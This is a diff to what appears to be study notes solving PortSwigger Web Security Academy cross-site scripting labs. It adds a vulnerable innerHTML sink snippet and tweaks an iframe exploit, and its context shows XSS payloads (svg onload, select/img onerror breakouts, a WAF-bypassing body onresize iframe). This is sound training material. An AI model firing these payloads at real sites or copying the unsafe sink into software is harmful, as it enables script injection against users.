@@ -75,6 +75,8 @@ tag:
                         }
                     </script>
 
+
+
 3. Break out of the img attribute by searching for: ``"><svg onload=alert(1)>``
 
 ## DOM XSS in document.write sink using source location.search inside a select element
@@ -100,6 +102,17 @@ product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
 
 ## DOM XSS in innerHTML sink using source location.search
 Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink
+
+tags:
+```js
+                           function doSearchQuery(query) {
+                                document.getElementById('searchMessage').innerHTML = query;
+                            }
+                            var query = (new URLSearchParams(window.location.search)).get('search');
+                            if(query) {
+                                doSearchQuery(query);
+                            }
+```
 
 <!-- omit in toc -->
 ### Solution
@@ -298,7 +311,7 @@ There is a *WAF* to protect the website from XSS. This firewall blocks HTML tags
 13. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the onresize payload, which caused a 200 response.
 14. Go to the exploit server and paste the following code, replacing your-lab-id with your lab ID:
 ```
-<iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```
 15. Click "Store" and "Deliver exploit to victim".
 
